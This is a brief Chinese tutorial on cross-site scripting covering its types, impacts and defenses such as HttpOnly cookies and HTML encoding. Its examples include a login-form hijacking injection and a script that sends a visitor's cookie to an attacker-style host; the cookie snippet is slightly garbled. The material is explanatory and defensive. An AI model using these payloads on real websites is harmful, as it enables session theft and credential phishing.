#### 基本概念
XSS：跨站脚本攻击，英文名称是Cross Site Script，XSS攻击，通常指黑客在存有安全漏洞的网站注入非法的 html 标签或者 javascript 代码，从而在用户浏览网页时，浏览器运行攻击代码，达到控制用户浏览器目的的一种攻击。举个例子：某个黑客发表了一篇文章其中包含了恶意的JS代码，所有访问这篇文章的人都会执行这段JS代码，这样就完成XSS攻击。
> XSS属于因输出值转义不完全引发的安全漏洞

#### 影响
1. 利用虚假输入表单骗取用户信息
2. 利用脚本窃取cookie，从而帮助攻击者发送恶意请求
3. 显示伪造的文章图片

#### 类型
DOM xss
反射型 xss
存储型 xss


#### 实现
例如：典型的表单圈套
```html
<div>
    <img src='...gif' alt='拍卖会'>
</div>
<form action='http://example.jp/login' method='get' id='login'>
<div>
  ID<input type='text' name='ID' value='"><script>var+f=document.getElementById('login');+f.action='目标网址';+f.method='get';<script><span+s="'/>
</div>
```

再如：
```javascript
var content=escape(document.cookie)//编码成字符串，现在用encodeURI 代替
document.write('<img src=http://hackr.jp/?');
document.write('content');
document.write('>');
```

#### 防御
1. HttpOnly：严格地说，HttpOnly并非为了对抗XSS——HttpOnly解决的是XSS后的Cookie劫持攻击。HttpOnly现在已经基本支持各种浏览器，但是HttpOnly只是有助于缓解XSS攻击，但仍然需要其他能够解决XSS漏洞的方案。
```
  // koa
  ctx.cookies.set(name, value, {
      httpOnly: true // 默认为 true
  })
```  
2. 输入检查，一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。
3. HtmlEncode:如果不需要用户输入 HTML，可以直接对用户的输入进行 HTML 转义
> 当用户输入<script>window.location.href=”http://www.baidu.com”;</script>, 最终保存结果为 &lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;, 在展现时，浏览器会对这些字符转换成文本内容，而不是一段可以执行的代码。

4.当用户需要输入 HTML 代码时：
> 当我们需要用户输入 HTML 的时候，需要对用户输入的内容做更加小心细致的处理。仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。更好的方法可能是，将用户的输入使用 HTML 解析库进行解析，获取其中的数据。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。
5. JavaScriptEncode:对下列字符加上反斜杠:",',\,\n,\r
